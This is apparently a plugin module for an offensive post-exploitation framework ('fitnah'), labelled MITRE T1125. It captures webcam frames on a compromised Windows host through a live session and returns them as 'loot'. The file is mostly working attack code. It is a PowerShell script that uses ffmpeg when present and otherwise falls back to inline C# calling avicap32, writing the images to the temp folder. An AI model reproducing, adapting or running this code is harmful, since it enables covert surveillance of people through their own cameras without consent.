"""collection/webcam_snap — capture webcam frame via DirectShow inline C# or ffmpeg fallback. MITRE T1125"""
from fitnah.sdk import BasePlugin, ModuleResult, mitre
from fitnah.sdk.schema import Param, ParamSchema


class WebcamSnap(BasePlugin):
    NAME        = "webcam_snap"
    DESCRIPTION = "Capture webcam frame(s) to JPEG via DirectShow C# or ffmpeg fallback."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1125"
    CATEGORY    = "collection"

    schema = ParamSchema().add(
        Param("device_index", int, required=False, default=0, help="Camera device index (0=default)"),
        Param("frame_count",  int, required=False, default=1, help="Number of frames to capture"),
    )

    # Inline C# using DirectShow COM interop via managed DirectShow.NET-style P/Invoke
    # Uses AVI capture via mciSendString as the most dep-free approach
    _CS_CAPTURE = (
        "using System;"
        "using System.Drawing;"
        "using System.Drawing.Imaging;"
        "using System.Runtime.InteropServices;"
        "using System.IO;"
        "public class CamCapture {"
        "  [DllImport(\"avicap32.dll\", CharSet=CharSet.Auto)]"
        "  public static extern IntPtr capCreateCaptureWindowA(string title, int style,"
        "    int x, int y, int w, int h, IntPtr parent, int id);"
        "  [DllImport(\"user32.dll\")] public static extern bool SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);"
        "  [DllImport(\"user32.dll\")] public static extern bool SendMessage(IntPtr hWnd, int msg, int wParam, string lParam);"
        "  [DllImport(\"user32.dll\")] public static extern bool DestroyWindow(IntPtr hWnd);"
        "  const int WM_CAP_START = 0x0400;"
        "  const int WM_CAP_DRIVER_CONNECT    = WM_CAP_START + 10;"
        "  const int WM_CAP_DRIVER_DISCONNECT = WM_CAP_START + 11;"
        "  const int WM_CAP_EDIT_COPY         = WM_CAP_START + 30;"
        "  const int WM_CAP_SET_PREVIEW       = WM_CAP_START + 50;"
        "  const int WM_CAP_SET_PREVIEWRATE   = WM_CAP_START + 52;"
        "  const int WM_CAP_GRAB_FRAME        = WM_CAP_START + 60;"
        "  const int WM_CAP_FILE_SAVEDIB      = WM_CAP_START + 25;"
        "  public static string Capture(int deviceIndex, string outPath) {"
        "    IntPtr hWnd = capCreateCaptureWindowA(\"cap\", 0, 0, 0, 640, 480, IntPtr.Zero, 0);"
        "    if (hWnd == IntPtr.Zero) return \"ERR:CreateWindow failed\";"
        "    bool conn = SendMessage(hWnd, WM_CAP_DRIVER_CONNECT, deviceIndex, 0);"
        "    if (!conn) { DestroyWindow(hWnd); return \"ERR:Connect device \" + deviceIndex + \" failed\"; }"
        "    System.Threading.Thread.Sleep(1500);"
        "    SendMessage(hWnd, WM_CAP_SET_PREVIEW, 0, 0);"
        "    SendMessage(hWnd, WM_CAP_GRAB_FRAME, 0, 0);"
        "    System.Threading.Thread.Sleep(200);"
        "    bool saved = SendMessage(hWnd, WM_CAP_FILE_SAVEDIB, 0, outPath);"
        "    SendMessage(hWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);"
        "    DestroyWindow(hWnd);"
        "    if (!saved) return \"ERR:SaveDIB failed\";"
        "    return \"OK:\" + outPath;"
        "  }"
        "}"
    )

    @mitre("T1125")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        device_index = int(params.get("device_index", 0))
        frame_count  = max(1, int(params.get("frame_count", 1)))
        cs_src       = self._CS_CAPTURE

        ps = (
            "$results = @();"
            # Try ffmpeg first as it's most reliable
            "$ff = Get-Command ffmpeg -EA SilentlyContinue;"
            "if ($ff) {"
            "  $results += '[*] Using ffmpeg';"
            "  $paths = @();"
            "  for ($i = 0; $i -lt " + str(frame_count) + "; $i++) {"
            "    $out = \"$env:TEMP\\webcam_$(Get-Random).jpg\";"
            "    $args2 = \"-f dshow -i video=\\\"\" + (& ffmpeg -list_devices true -f dshow -i dummy 2>&1 | Select-String 'video' | Select-Object -First 1 -ExpandProperty Line) + \"\\\" -frames:v 1 `\"$out`\" -y\";"
            "    & ffmpeg -f dshow -i \"video=\" + (& ffmpeg -list_devices true -f dshow -i dummy 2>&1 | Where-Object { $_ -match 'video' } | Select-Object -First 1) "
            "     -frames:v 1 $out -y 2>$null | Out-Null;"
            "    if (Test-Path $out) { $paths += $out; $results += \"[+] Frame $i: $out\" }"
            "    else { $results += \"[-] Frame $i: ffmpeg capture failed\" };"
            "  };"
            "} else {"
            "  $results += '[*] ffmpeg not found, using avicap32 DirectShow C#';"
            "  Add-Type -TypeDefinition '" + cs_src + "' -Language CSharp -ReferencedAssemblies System.Drawing;"
            "  $paths = @();"
            "  for ($i = 0; $i -lt " + str(frame_count) + "; $i++) {"
            "    $bmpPath = \"$env:TEMP\\webcam_$(Get-Random).bmp\";"
            "    $jpgPath = $bmpPath -replace '\\.bmp$','.jpg';"
            "    $res = [CamCapture]::Capture(" + str(device_index) + ", $bmpPath);"
            "    if ($res.StartsWith('OK:') -and (Test-Path $bmpPath)) {"
            "      try {"
            "        Add-Type -AssemblyName System.Drawing;"
            "        $bmp = [System.Drawing.Image]::FromFile($bmpPath);"
            "        $enc = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' };"
            "        $ep  = New-Object System.Drawing.Imaging.EncoderParameters(1);"
            "        $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]85);"
            "        $bmp.Save($jpgPath, $enc, $ep);"
            "        $bmp.Dispose();"
            "        Remove-Item $bmpPath -Force -EA SilentlyContinue;"
            "        $paths += $jpgPath;"
            "        $sz = (Get-Item $jpgPath).Length;"
            "        $results += \"[+] Frame $i: $jpgPath ($([Math]::Round($sz/1KB,1)) KB)\";"
            "      } catch {"
            "        $paths += $bmpPath;"
            "        $results += \"[+] Frame $i (BMP): $bmpPath\";"
            "      };"
            "    } else {"
            "      $results += \"[-] Frame $i: $res\";"
            "    };"
            "    Start-Sleep -Milliseconds 300;"
            "  };"
            "};"
            "$results += \"Captured $($paths.Count) of " + str(frame_count) + " frame(s).\";"
            "$results -join \"`n\""
        )

        r = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(r["output"])
        return ModuleResult.ok(data=r["output"], loot_kind="webcam_snap")
